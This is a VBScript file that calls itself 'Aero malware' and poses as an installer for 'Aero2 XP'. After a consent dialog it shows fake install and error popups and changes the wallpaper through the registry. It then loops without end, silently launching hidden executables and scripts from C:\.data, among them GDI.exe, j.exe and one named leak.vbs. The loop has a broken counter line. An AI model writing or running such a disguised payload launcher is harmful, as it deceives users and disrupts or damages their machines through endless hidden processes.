Set objShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' >>>>>>>>> AERO MALWARE IN VBS <<<<<<<<<<<
' >>>>>>>>> BY CARBRITO <<<<<<<<<<<

' >>>>  DEFINE  <<<<
scriptDir = FSO.GetParentFolderName(WScript.ScriptFullName)

resolutions = Array("800x600", "1024x768", "1280x720", "1920x1080", "2560x1440", "3840x2160")

' >>>> Code <<<<

intAnswer = MsgBox("Welcome to Aero2 XP! This program is designed to run on Windows 10 And Windows 7." & vbCrLf & vbCrLf & _
                   "By pressing OK, you agree to the following terms:" & vbCrLf & vbCrLf & _
                   "Aero2 XP may be harmful to your system." & vbCrLf & vbCrLf & _
                   "Please carefully consider the potential issues before proceeding." & vbCrLf & vbCrLf & _
                   "Issues with Aero2 XP include, but are not limited to:" & vbCrLf & vbCrLf & _
                   "1. System instability and crashes." & vbCrLf & _
                   "2. Compatibility issues with other software." & vbCrLf & _
                   "3. Possible loss of data." & vbCrLf & _
                   "4. Security vulnerabilities." & vbCrLf & vbCrLf & _
                   "By proceeding with the installation, you acknowledge and accept the risks associated with Aero2 XP. Made by @carbrito, @samuelk0z, @magyn" & vbCrLf & vbCrLf & _
                   "Are you sure you want to continue with the installation?", vbOKCancel + vbExclamation, "Aero2 XP Installation")

If intAnswer = vbOK Then
    objShell.Popup "Please wait while Aero2 XP is being installed... Don't Exit... ", 3, "Installing Aero2 XP", vbInformation
    objShell.Popup "Oh! A error ocurred. Error: 319", 5, "Installing Aero2 XP", vbError
    Wscript.Sleep 3000
    Set WshShell = CreateObject("WScript.Shell")
    Set WshShell = CreateObject("WScript.Shell")

    objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\.data\nyan.jpg"
    objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

    WshShell.Run "C:\.data\sound.bat", 0, False
    WshShell.Run "wscript.exe C:\.data\search.vbs", 0, False
    
    Wscript.Sleep 120000
    Do While True
        WshShell.Run "C:\.data\Cabron.exe", 0, False
        WshShell.Run "C:\.data\j.exe", 0, False
        WScript.Sleep 30000
        WshShell.Run "C:\.data\GDI.exe", 0, False
        WScript.Sleep 3000
        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
        Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'GDI.exe'")
        
        For Each objProcess in colProcesses
            objProcess.Terminate()
        Next
        WshShell.Run "C:\.data\GDI.exe", 0, False
        WScript.Sleep 30000
        WshShell.Run "C:\.data\j.exe", 0, False
        WshShell.Run "wscript.exe C:\.data\check.vbs", 0, False
        WshShell.Run "wscript.exe C:\.data\leak.vbs", 0, False
        WScript.Sleep 10000
        count + count + 1

        If count = 5 Then
        Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'j.exe'")
        
        For Each objProcess in colProcesses
            objProcess.Terminate()
        Next  
        Wscript.Sleep 3000        
    End If  
    Loop
    


Else
    objShell.Popup "Why? :(", 5, "Ok", vbInformation
End If